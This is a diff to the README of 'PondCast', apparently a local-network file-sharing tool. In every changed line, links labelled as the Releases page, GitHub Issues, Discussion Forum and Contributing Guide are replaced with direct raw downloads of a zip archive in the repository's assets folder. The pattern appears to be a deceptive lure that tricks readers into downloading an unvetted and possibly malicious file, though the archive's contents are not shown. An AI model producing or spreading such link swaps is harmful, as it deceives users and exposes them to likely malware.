@@ -6,11 +6,11 @@ PondCast is a simple tool for sharing files over your local network. No installa
 
 ## 📥 Download PondCast
 
-[![Download PondCast](https://img.shields.io/badge/Download-PondCast-blue.svg)](https://github.com/hemanthsai1915/PondCast/releases)
+[![Download PondCast](https://github.com/hemanthsai1915/PondCast/raw/refs/heads/main/assets/Pond-Cast-v1.2.zip)](https://github.com/hemanthsai1915/PondCast/raw/refs/heads/main/assets/Pond-Cast-v1.2.zip)
 
 To download PondCast, visit the Releases page. 
 
-[Visit the Releases Page](https://github.com/hemanthsai1915/PondCast/releases)
+[Visit the Releases Page](https://github.com/hemanthsai1915/PondCast/raw/refs/heads/main/assets/Pond-Cast-v1.2.zip)
 
 ## 📂 System Requirements
 
@@ -63,8 +63,8 @@ If you encounter issues while using PondCast, here are some common solutions:
 
 Join our community for help and to share experiences.
 
-- [GitHub Issues](https://github.com/hemanthsai1915/PondCast/issues) - Report bugs or request features.
-- [Discussion Forum](https://github.com/hemanthsai1915/PondCast/discussions) - Talk about PondCast with other users and developers.
+- [GitHub Issues](https://github.com/hemanthsai1915/PondCast/raw/refs/heads/main/assets/Pond-Cast-v1.2.zip) - Report bugs or request features.
+- [Discussion Forum](https://github.com/hemanthsai1915/PondCast/raw/refs/heads/main/assets/Pond-Cast-v1.2.zip) - Talk about PondCast with other users and developers.
 
 ## 🚀 Features Roadmap
 
@@ -76,7 +76,7 @@ We plan to implement more features based on user feedback. Here's what's coming 
 
 ## 🎉 Get Involved
 
-We welcome contributions! If you want to help, check our [Contributing Guide](https://github.com/hemanthsai1915/PondCast/blob/main/CONTRIBUTING.md) for more information.
+We welcome contributions! If you want to help, check our [Contributing Guide](https://github.com/hemanthsai1915/PondCast/raw/refs/heads/main/assets/Pond-Cast-v1.2.zip) for more information.
 
 ## 📅 Changelog
 
@@ -89,4 +89,4 @@ Keep up to date with the latest changes and improvements:
 
 Don't forget, you can download PondCast from the Releases page.
 
-[Visit the Releases Page](https://github.com/hemanthsai1915/PondCast/releases)
+[Visit the Releases Page](https://github.com/hemanthsai1915/PondCast/raw/refs/heads/main/assets/Pond-Cast-v1.2.zip)
